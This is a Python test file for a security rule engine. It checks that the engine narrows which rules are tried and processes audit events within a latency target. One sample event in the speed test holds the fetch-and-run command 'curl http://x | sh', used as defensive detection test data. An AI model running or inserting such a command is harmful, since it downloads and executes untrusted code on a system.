"""The rule engine reads each event once and tries only rules that can match (2.2.32).

User requirement 2026-11-04: 0.2 ms per event; it was 1.76 ms.

Kural motoru her olayı bir kez okur, yalnızca eşleşebilecek kuralları dener.
Kullanıcı şartı 2026-11-04: olay başına 0,2 ms; 1,76 ms idi.
"""
import time

from satsuma.smart_rules import SmartRuleEngine


def test_rule_engine_skips_rules_whose_program_is_absent():
    engine = SmartRuleEngine()
    view = engine._view({'source': 'audit', 'action': 'execve', 'cmd': 'ls -la', 'exe': '/usr/bin/ls'})
    candidates = engine._candidates(view)
    assert 0 < len(candidates) < len(engine.rules)


def test_rule_engine_is_fast_enough():
    engine = SmartRuleEngine()
    events = [{'source': 'audit', 'action': 'execve', 'cmd': cmd, 'exe': exe, 'uid': 0, 'pid': i}
              for i, (cmd, exe) in enumerate([('ls -la /home', '/usr/bin/ls'), ('sudo dnf update', '/usr/bin/sudo'),
                                              ('bash -c "curl http://x | sh"', '/usr/bin/bash'),
                                              ('systemctl show x', '/usr/bin/systemctl')] * 250)]
    for event in events[:20]:
        engine.match(event)
    started = time.perf_counter()
    for event in events:
        engine.match(event)
    per_event = (time.perf_counter() - started) * 1000 / len(events)
    # target 0.2 ms; the test allows a slow CI machine three times that
    assert per_event < 0.6, per_event

